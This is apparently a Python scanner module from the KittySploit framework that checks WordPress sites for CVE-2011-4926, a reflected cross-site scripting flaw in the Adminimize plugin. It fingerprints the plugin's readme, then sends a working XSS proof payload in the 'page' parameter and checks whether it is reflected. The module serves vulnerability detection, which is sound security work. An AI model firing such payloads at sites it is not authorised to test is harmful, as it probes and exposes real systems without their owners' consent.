#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in adminimize/adminimize_page."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adminimize 1.7.22 - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting vulnerability in adminimize/adminimize_page.php in the Adminimize plugin before 1.7.22 for WordPress allows remote attackers to inject arbitrary web script or HTML via the page parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2011', 'cve', 'wordpress', 'xss', 'wp-plugin', 'bueltge', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4926',
            'https://www.whitesourcesoftware.com/vulnerability-database/CVE-2011-4926',
            'http://plugins.trac.wordpress.org/changeset?reponame=&new=467338@adminimize&old=466900@adminimize#file5',
            'http://www.openwall.com/lists/oss-security/2012/01/10/9',
            'http://wordpress.org/extend/plugins/adminimize/changelog/',
        ],
        'cve': 'CVE-2011-4926',
    }

    def run(self):
        path = '/wp-content/plugins/adminimize/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Adminimize ===',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/adminimize/adminimize_page.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Adminimize 1.7.22 - Cross-Site Scripting detected', path=path)
            return True
        return False

